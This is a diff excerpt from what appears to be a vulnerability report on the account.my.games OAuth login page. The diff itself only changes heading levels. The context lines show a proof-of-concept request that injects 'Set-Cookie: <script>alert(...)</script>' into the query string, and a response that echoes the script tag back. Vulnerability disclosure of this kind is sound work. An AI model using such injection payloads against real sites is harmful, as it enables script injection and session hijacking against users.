@@ -27,7 +27,7 @@ https://account.my.games//oauth2/login/?continue=https%3A%2F%2Faccount.my.games%
 
 Subsequently, the request containing the payload was sent and the response was observed.
 
-## Request
+### Request
 
 ```http
 GET /oauth2/login/?continue=https%3A%2F%2Faccount.my.games%2Foauth2%2F%3Fredirect_uri%3Dhttps%253A%252F%252Flootdog.io%252Fsocial%252Fcomplete%252Fo2mygames%252F%26client_id%3Dlootdog_io%26response_type%3Dcode%26signup_social%3Dmailru%2Cfb%2Cok%2Cvk%2Cg%2Ctwitch%2Ctw%26signup_method%3Demail%252Cphone%26lang%3DEN&client_id=lootdog_io&lang=EN&signup_method=email%2Cphone&signup_social=mailru%2Cfb%2Cok%2Cvk%2Cg%2Ctwitch%2Ctw&Set-Cookie: <script>alert("Hacked By Deathstroke")</script> HTTP/1.1 
@@ -40,7 +40,7 @@ Referer: https://lootdog.io/
 Connection: close
 ```
 
-## Response
+### Response
 
 ```http
 <script>alert("Hacked By Deathstroke")</script> HTTP/1.0 200 OK 
